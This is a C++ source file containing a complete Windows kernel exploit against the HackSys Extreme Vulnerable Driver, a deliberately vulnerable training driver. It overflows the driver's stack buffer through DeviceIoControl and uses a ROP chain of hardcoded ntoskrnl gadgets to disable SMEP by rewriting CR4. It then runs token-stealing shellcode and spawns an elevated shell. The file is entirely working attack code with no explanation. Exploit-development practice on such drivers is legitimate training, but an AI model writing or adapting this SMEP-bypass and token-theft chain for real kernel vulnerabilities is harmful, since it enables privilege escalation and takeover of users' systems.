#include "StackOverflow.hpp"

VOID StackOverflowExploit()
{
	BOOL ret;
	DWORD dwRet;
	wprintf(L"[+] Open device\r\n");
	HANDLE hDevice = CreateFileW(
		TEXT(DEVICE_LINK_NAME),
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		Error("open device");
	}


	DWORD64 ntBase = GetModuleBase(TEXT("ntoskrnl.exe"));
	LPVOID lpBuffer = VirtualAlloc((LPVOID)0x1337000, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	LPVOID lpShellcode = VirtualAlloc(NULL, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	// 0x00000000003a0a67: mov cr4, rcx; ret;
	DWORD64 MOV_CR4_RCX = ntBase + 0x00000000003a0a67;
	// 0x00000000002148c8: pop rcx; ret;
	DWORD64 POP_RCX_RET = ntBase + 0x00000000002148c8;
	if (lpBuffer == NULL)
	{
		Error("VirtualAlloc");
	}

	RtlFillMemory(lpBuffer, 0x1000, 0x43);
	RtlCopyMemory(lpShellcode, StealToken, 0x100);

	PDWORD64 rop = (PDWORD64)((DWORD64)lpBuffer + 0x818);
	*rop++ = POP_RCX_RET;
	*rop++ = 0x350ef8 ^ 1UL << 20;
	*rop++ = MOV_CR4_RCX;
	*rop++ = (DWORD64)lpShellcode;

	wprintf(L"Stack overflow\r\n");
	// bp HEVD+0x866AE memmove
	ret = DeviceIoControl(hDevice, IOCTL_STACK_OVERFLOW, lpBuffer, 0x900, NULL, 0, &dwRet, NULL);
	if (!ret)
	{
		Error("DeviceIoControl");
	}

	wprintf(L"[+] get shell\r\n");
	Sleep(2);
	//system("cmd.exe");
	SpawnShell();
	VirtualFree(lpBuffer, 0, MEM_RELEASE);
}